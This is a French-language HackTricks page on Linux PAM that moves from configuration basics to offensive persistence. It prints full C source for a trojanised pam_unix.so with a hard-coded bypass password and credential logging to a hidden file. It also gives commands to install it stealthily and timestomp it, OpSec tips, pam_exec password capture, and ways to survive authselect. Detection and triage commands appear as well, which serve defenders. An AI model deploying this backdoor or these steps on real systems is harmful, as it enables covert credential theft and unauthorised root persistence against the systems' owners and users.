# PAM - Modules d'authentification enfichables

{{#include ../../banners/hacktricks-training.md}}

### Informations de base

**PAM (Pluggable Authentication Modules)** agit comme un mécanisme de sécurité qui **vérifie l'identité des utilisateurs tentant d'accéder à des services informatiques**, en contrôlant leur accès selon différents critères. Il s'apparente à un gardien numérique, garantissant que seuls les utilisateurs autorisés peuvent utiliser certains services tout en pouvant limiter leur utilisation afin d'éviter la surcharge des systèmes.

#### Fichiers de configuration

- Les **systèmes Solaris et basés sur UNIX** utilisent généralement un fichier de configuration central situé dans `/etc/pam.conf`.
- Les **systèmes Linux** privilégient une approche basée sur un répertoire, en stockant les configurations propres aux services dans `/etc/pam.d`. Par exemple, le fichier de configuration du service login se trouve dans `/etc/pam.d/login`.

Un exemple de configuration PAM pour le service login pourrait ressembler à ceci :
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM Management Realms**

Ces realms, ou groupes de gestion, comprennent **auth**, **account**, **password** et **session**, chacun étant responsable de différents aspects du processus d'authentification et de gestion des sessions :

- **Auth** : Valide l'identité de l'utilisateur, souvent en demandant un mot de passe.
- **Account** : Gère la vérification du compte, en contrôlant des conditions telles que l'appartenance à un groupe ou les restrictions horaires.
- **Password** : Gère les mises à jour des mots de passe, notamment les vérifications de complexité et la prévention des dictionary attacks.
- **Session** : Gère les actions au démarrage ou à la fin d'une session de service, comme le montage de répertoires ou la définition de limites de ressources.

#### **PAM Module Controls**

Les contrôles déterminent la réponse du module en cas de succès ou d'échec, influençant ainsi le processus global d'authentification. Ils comprennent :

- **Required** : L'échec d'un module required entraîne finalement un échec, mais seulement après la vérification de tous les modules suivants.
- **Requisite** : Met immédiatement fin au processus en cas d'échec.
- **Sufficient** : Un succès permet d'ignorer les vérifications restantes du même realm, sauf si un module suivant échoue.
- **Optional** : N'entraîne un échec que s'il s'agit du seul module de la stack.

#### Offensive Semantics That Matter

Lors du backdooring de PAM, **l'emplacement de la règle insérée** est souvent plus important que le payload lui-même :

- `include` et `substack` récupèrent des règles depuis d'autres fichiers. Modifier `sshd` peut donc n'affecter que SSH, tandis que modifier `system-auth`, `common-auth` ou une autre stack partagée peut affecter plusieurs services simultanément.
- PAM prend également en charge les contrôles entre crochets tels que `[success=1 default=ignore]`. Ceux-ci peuvent être exploités pour **ignorer un ou plusieurs modules** après une vérification personnalisée réussie, au lieu de remplacer visiblement `pam_unix.so`.
- Le `module-path` peut être **absolu** (`/usr/lib/security/pam_custom.so`) ou **relatif** au répertoire par défaut des modules PAM. Sur les systèmes Linux modernes, les répertoires réels sont souvent `/lib/security`, `/lib64/security`, `/usr/lib/security` ou des chemins multiarch comme `/usr/lib/x86_64-linux-gnu/security`.

À retenir pour l'opérateur : cartographiez toujours le **graphe complet des services** avant d'appliquer un patch. Par exemple, `sshd -> password-auth -> system-auth` sur certaines distributions, ou `sshd -> system-remote-login -> system-login -> system-auth` sur d'autres, signifie que le même implant d'une seule ligne peut se propager bien plus largement que prévu.

#### Example Scenario

Dans une configuration comportant plusieurs modules d'authentification, le processus suit un ordre strict. Si le module `pam_securetty` détermine que le terminal de login n'est pas autorisé, les logins root sont bloqués, mais tous les modules sont tout de même traités en raison de son statut "required". Le module `pam_env` définit des variables d'environnement, ce qui peut améliorer l'expérience utilisateur. Les modules `pam_ldap` et `pam_unix` fonctionnent ensemble pour authentifier l'utilisateur, `pam_unix` tentant d'utiliser un mot de passe fourni précédemment, ce qui améliore l'efficacité et la flexibilité des méthodes d'authentification.


## Backdooring PAM – Hooking `pam_unix.so`

Une technique classique de persistence dans les environnements Linux sensibles consiste à **remplacer la bibliothèque PAM légitime par un drop-in trojanisé**. Comme chaque login SSH / console finit par appeler `pam_unix.so:pam_sm_authenticate()`, quelques lignes de C suffisent pour capturer des credentials ou implémenter un bypass de mot de passe *magic*.

### Compilation Cheatsheet
<details>
<summary>Sample `pam_unix.so` trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
</details>

Compiler et remplacer furtivement :
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### Conseils d’OpSec
1. **Écrasement atomique** – écrire dans un fichier temporaire, puis utiliser `mv` pour le mettre en place afin d’éviter des bibliothèques partiellement écrites qui bloqueraient SSH.
2. Un emplacement de fichier de log tel que `/usr/bin/.dbus.log` se fond parmi les artefacts légitimes du desktop.
3. Conserver les exports de symboles identiques (`pam_sm_setcred`, etc.) afin d’éviter un comportement incorrect de PAM.

### Détection
* Comparer le MD5/SHA256 de `pam_unix.so` avec celui du package de la distro.
* `rpm -V pam` ou `debsums -s libpam-modules` pour repérer les bibliothèques remplacées sans effectuer de hash manuel.
* Vérifier la présence de permissions en écriture pour tous ou d’une ownership inhabituelle sous `/lib/security/`.
* Règle `auditd` : `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Rechercher dans les configurations PAM les modules inattendus : `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Commandes de triage rapide (après une compromission ou lors d’une threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Abus de `pam_exec` pour la persistance
Au lieu de remplacer `pam_unix.so`, une approche plus légère consiste à ajouter une ligne `pam_exec` dans `/etc/pam.d/sshd` afin que chaque connexion SSH lance un implant tout en laissant la stack normale intacte :
```bash
# Run on successful auth and receive the typed password on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` reçoit les métadonnées PAM dans des variables d’environnement telles que `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` et `PAM_TYPE`. Avec `expose_authtok`, le helper peut également lire le mot de passe depuis `stdin` pendant les phases `auth` ou `password`. Si vous voulez que le helper s’exécute avec l’UID effectif au lieu de l’UID réel, ajoutez `seteuid`.

Notes pratiques :

- `session optional pam_exec.so ...` est préférable pour les **actions post-connexion**, comme la réouverture de sockets ou le lancement d’un daemon détaché.
- `auth optional pam_exec.so quiet expose_authtok ...` est le choix habituel pour la **capture d’identifiants**, car il s’exécute avant l’ouverture de la session.
- `type=session` ou `type=auth` peut être utilisé pour limiter l’exécution à une phase PAM spécifique et éviter une double exécution inutile.

### Résister aux outils de la distribution : `authselect`

Sur RHEL, CentOS Stream, Fedora et les systèmes dérivés, les modifications directes de fichiers générés tels que `/etc/pam.d/system-auth` ou `/etc/pam.d/password-auth` peuvent être **écrasées par `authselect`**. Pour assurer la persistance, les opérateurs modifient souvent le profil personnalisé actif sous `/etc/authselect/custom/<profile>/`, puis le sélectionnent à nouveau ou l’appliquent.

Workflow typique lorsque vous avez les privilèges root :
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Re-apply the profile after modifying the template files
authselect select custom/<profile>
```
Cela est important à la fois pour l’offensive et le triage : si `/etc/pam.d/system-auth` contient la bannière `Generated by authselect` et `Do not modify this file manually`, le véritable point de persistence peut se trouver sous `/etc/authselect/custom/` plutôt que dans `/etc/pam.d/`.

### Tradecraft récent observé dans la nature

Des rapports récents de 2025 concernant le **Plague** Linux backdoor ont montré la même idée fondamentale poussée plus loin : un composant PAM malveillant avec un **mot de passe de contournement statique**, ainsi que le nettoyage des variables d’environnement liées à SSH et de l’historique du shell (`HISTFILE=/dev/null`) afin de réduire les traces de session après la connexion. Il s’agit d’un pattern de hunting utile, car la logique du backdoor peut résider dans PAM tandis que les artefacts de furtivité n’apparaissent qu’**après** la réussite de l’authentification.


## Références

- [pam.conf(5) / pam.d(5) - Manuel Linux-PAM](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [Nextron Systems - Plague : un nouveau backdoor basé sur PAM pour Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)

{{#include ../../banners/hacktricks-training.md}}
